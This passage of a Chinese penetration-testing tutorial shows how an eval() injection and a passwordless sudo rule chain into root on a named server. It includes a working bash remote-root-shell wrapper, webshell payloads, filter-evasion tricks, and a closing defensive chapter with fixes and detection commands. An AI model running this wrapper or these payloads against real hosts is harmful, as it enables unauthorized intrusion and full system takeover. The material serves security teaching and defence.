| 用户 | 能用 `sudo -n` 吗 | 原因 |
|---|---|---|
| `root` | 不需要 sudo | 本身就是 root |
| **`admin`** | **能，免密** | `sudoers` 里明确写了 `admin ... NOPASSWD: ALL` |
| `www-data` | **不能** | 不在 sudoers 里 |
| `sysupd` | **不能** | 不在 sudoers 里 |
| 其他用户 | 不能 | 不在 sudoers 里 |

**所以准确的表述是**：

> **不是"任何用户都能 sudo -n"，而是"`admin` 这个用户被配置了免密 sudo，而 Web 应用恰好以 `admin` 身份运行"。**

**为什么攻击者能利用**：

```
Web 应用（Apache/PHP）以 admin 用户身份运行
   ↓
我们在 Web 应用里执行命令 → 就是 admin 身份
   ↓
admin 有免密 sudo → 一条命令到 root
```

**如果 Web 应用是以 `www-data` 运行的**（这是正常配置），我们就只是 `www-data`，即使有 RCE 也提不了权。

**这就是为什么这是"两个缺陷叠加"**：

| 缺陷 | 位置 | 单独存在时的后果 |
|---|---|---|
| ① `eval()` 用户输入 | `integration.php` | 能执行命令，但只是 `admin`，读不了 `/root`、`/etc/shadow` |
| ② `admin` 免密 sudo | `/etc/sudoers` | 有 `admin` 的 shell 就能 root，但没有 shell 就用不上 |
| ①+② | — | **从 Web 请求直接到 root** |

**修复任意一个，这条链就断了。**

# 第 7 章 稳定通道

## 7.1 为什么需要"稳定通道"

现在每次执行命令都要写一长串 curl，很麻烦。而且：
- 不能保持 `cd`
- 不能保持环境变量
- 每条命令都是独立请求

**目标**：封装成"像 ssh 一样用"的工具。

## 7.2 第一反应：落个 webshell

**思路**：写一个 `<?php system($_GET['c']);?>` 到网站目录，之后用 `?c=命令` 执行。

**为什么这个思路是对的**：这是最经典的"持久化"手法。

**但本例失败了**，原因很具体（第 8 章坑 3、坑 4 详述）：

| 尝试 | 结果 | 原因 |
|---|---|---|
| `file_put_contents("x.php", "<?php system(\$_GET[c]);?>")` | 生成了 `1.php`，内容 `<?php system();?>` | `x` 被改写、`$_GET[c]` 被求值 |
| `hex2bin(...)` | 语法错误 `$x2bin` | `he` 被删、`x` 前加了 `$` |
| `pack("H*", hex)` | 超时 | 可能被禁用 |

**结论：这个 eval 入口对输入有字符串替换，不适合落 webshell。**

## 7.3 最终方案：base64 封装

```bash
#!/bin/bash
# vps_shell.sh
IP=101.132.83.252
URL="http://$IP/integration.php"

run() {
  # 把命令 base64 编码，绕开 eval 对特殊字符的破坏
  local b64=$(printf 'cd /; %s' "$1" | base64 -w0)
  curl -s -m 60 -G \
    --data-urlencode "x=1" \
    --data-urlencode "func=system(\"echo $b64 | base64 -d | sudo -n bash\")" \
    "$URL"
}

if [ -n "$1" ]; then run "$*"; exit 0; fi
while true; do
  printf 'root@target:/# '
  IFS= read -r cmd
  [ -z "$cmd" ] && continue
  case "$cmd" in exit|quit) break ;; esac
  run "$cmd"
done
```

**核心原理拆解**：

```bash
func=system("echo <base64> | base64 -d | sudo -n bash")
```

| 部分 | 作用 |
|---|---|
| `echo <base64>` | 把编码后的命令打印出来 |
| `base64 -d` | 解码回原始命令 |
| `sudo -n bash` | 以 root 身份执行 bash，从 stdin 读脚本 |

**为什么这样能绕过过滤**：

- 原始命令里有 `$`、`'`、`"`、`|`，直接传会被 eval 破坏
- base64 编码后只剩 `A-Za-z0-9+/=`，**eval 不会破坏这些字符**
- 到了 shell 层面再解码，还原成原始命令

**`cd /;` 的作用**：每条命令都从根目录开始（因为 cwd 不跨命令保持）。

# 第 8 章 七个坑（新手必卡）

这一章比前面所有命令都值钱——**教程通常不写，但你一定会遇到**。

## 坑 1：提示符是假的，`cd` 不生效

**现象**：

```
root@target:/var/www/html# cd /
root@target:/var/www/html# pwd
/var/www/html
```

`cd /` 之后 `pwd` 还是 `/var/www/html`。

**原因**：

这**不是真 shell**。每条命令都是 Apache fork 一个新进程：

```
请求 1 → Apache fork → PHP 进程 1（cwd=/var/www/html）→ 执行 cd / → 进程退出
请求 2 → Apache fork → PHP 进程 2（cwd=/var/www/html）→ 执行 pwd → 输出 /var/www/html
```

`cd` 改的是**进程 1 的 cwd**，进程 1 已经退出了。进程 2 是全新的，cwd 又回到 Apache 的默认目录。

**解决**：每条命令前加 `cd /`，或者用绝对路径。

**通用教训**：**RCE 没有会话状态。** 环境变量、`cd`、`export`、`umask` 全部不保持。

## 坑 2：`awk '{print $4}'` 全部失效

**现象**：所有带 `awk '{print $N}'` 的命令返回空。

**原因**：

命令是通过 `sudo -n bash` 从 **stdin** 执行的：

```bash
echo <base64> | base64 -d | sudo -n bash
```

bash 读到脚本内容 `awk '{print $4}'` 后，会先做**变量展开**——把 `$4` 当成"第 4 个位置参数"（为空），于是 awk 收到的是 `awk '{print }'`。

**解决**：

- 把 `$` 转义：`awk '{print \$4}'`
- 或者不用 awk：`cut -d: -f2`、`grep -o`、`sed`

## 坑 3：字母 `x` 会破坏 payload

**现象**：

| 你写的 | 实际执行的 |
|---|---|
| `hex2bin(...)` | `$x2bin(...)` |
| `x.php` | `1.php` |
| `$_GET[c]` | （空） |

**原因**：`integration.php` 对输入做了字符串替换，`x` 被特殊处理。

**解决**：

- **避开 `x`**：用通配符 `ls /etc/syste*/` 代替 `ls /etc/systemd/`
- **用 base64 传输**（但 base64 里也可能含 `x`，要检查）
- **用 `pack`/`chr` 构造**（如果没被禁用）

**通用教训**：遇到奇怪的字符替换，**先做小实验摸清规则**（`func=print("a")`、`func=print("x")` 对比），再设计 payload。

## 坑 4：字符串里的 `?>` 会提前关闭 PHP 标签

**现象**：

```php
file_put_contents("z.php", "<?php system($_GET[c]);?>")
```

报语法错误。

**原因**：

`eval()` 执行的代码**本身就在 PHP 模式里**。字符串中出现 `?>` 会让 PHP 解析器**提前退出 PHP 模式**，后面的内容被当成 HTML 输出，导致语法错误。

**解决**：

- PHP 允许省略结尾的 `?>`：写 `"<?php system($_GET[c]);"` 即可
- 或者用 `base64_decode` 传入内容

## 坑 5：`ss -tn` 输出爆炸

**现象**：执行 `ss -tn` 后输出几万行，把响应撑爆，curl 卡死。

**原因**：这台机器有 **2 万多条 TCP 连接**（木马在爆破），不带 `-l` 的 `ss` 会把所有连接都列出来。

**解决**：只用 `ss -lnt`（只列 LISTEN），或者读 `/proc/net/tcp` 再过滤。

**通用教训**：**在被入侵的机器上，任何"列全部"的命令都可能爆炸。** 永远加 `head`、`grep`、`-l` 限制输出。

## 坑 6：base64 里的 `+` 在 URL 传输中被破坏

**现象**：base64 编码的命令时好时坏。

**原因**：URL 里的 `+` 会被服务端解码成空格，导致 base64 解码失败。

**解决**：

- 用 `--data-urlencode` 正确编码（它会处理 `+`）
- 或者改用 **hex 编码**（只含 `0-9a-f`，绝对安全）

## 坑 7：命令里的重定向误建文件

**现象**：执行 `awk '{print $5}'` 后，目标机上多了一个 `1{print` 文件。

**原因**：单引号被 eval 吞掉后，shell 把 `{print $5}` 当成**重定向目标**，创建了文件：

```bash
# 你以为是：
awk '{print $5}'

# shell 实际看到的是：
awk {print $5}
# → 被理解为：执行 awk，同时把输出重定向到名为 "{print" 的文件
```

**解决**：**在别人机器上执行命令，永远先想清楚副作用。** 用 `bash -n` 干跑、或者先 `echo` 出来看看。

**这次误建的文件我已经清理了**，但这是个真实的教训。

# 第 9 章 防守视角

渗透的目的是改进防守。这条链上每一环都有对应的防护：

| 环节 | 缺陷 | 防护 |
|---|---|---|
| Web 入口 | `eval()` 用户输入 | **永不对用户输入用 eval/exec/system**；用白名单数学解析器 |
| 参数校验 | 只替换个别字符（黑名单） | 改成**白名单**：只允许 `[0-9+\-*/^()]` |
| 进程身份 | Web 应用以 `admin` 运行 | Web 进程用 `www-data`（低权限专用账号） |
| sudo 配置 | `admin NOPASSWD: ALL` | 精确授权到具体命令，**永远不给 `ALL`** |
| root 密码 | `root::`（空） | 设强密码 |
| sshd 配置 | `PermitEmptyPasswords yes` | 改为 `no`，只允许密钥登录 |
| 文件暴露 | `info.php`、`.bak`、`sql/`、`upload/` | 生产环境删除所有调试/备份文件 |
| 端口暴露 | 139/445 对公网开放 | 安全组只放必要端口 |
| 日志监控 | 没人看 access.log | 见下方检测命令 |

**检测命令**：

```bash
# 1. 找可疑的 func 参数请求
grep -E "func=.*(system|exec|passthru|shell_exec|eval)" /var/log/apache2/access.log

# 2. 看有没有人频繁请求同一个 PHP
awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# 3. 检查 sshd 是否允许空密码
sshd -T | grep -E "permitemptypasswords|permitrootlogin"

# 4. 检查谁有免密 sudo
grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/

# 5. 检查 authorized_keys 里有没有陌生 key
for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
done
```

# 结语：新手和熟手的差别

不在于会不会用工具，而在于四个习惯：

1. **会读报错**——报错是服务端主动告诉你的信息，`Undefined constant` 直接告诉你"这是 PHP 代码执行"
2. **先确认身份再动手**——`id` 比任何扫描器都重要，`groups` 里的 `sudo` 就是提权的路
3. **注意副作用**——在别人机器上执行命令，先想清楚会不会建文件、会不会删东西
4. **失败时分析原因**——本文 7 个坑，每一个都是"为什么失败"的答案；不分析就永远卡在那

**最后一句话**：这条链的核心不是"某个漏洞"，而是**两个独立缺陷的叠加**。修掉任意一个，整条链就断了——这也是防守方最应该记住的。
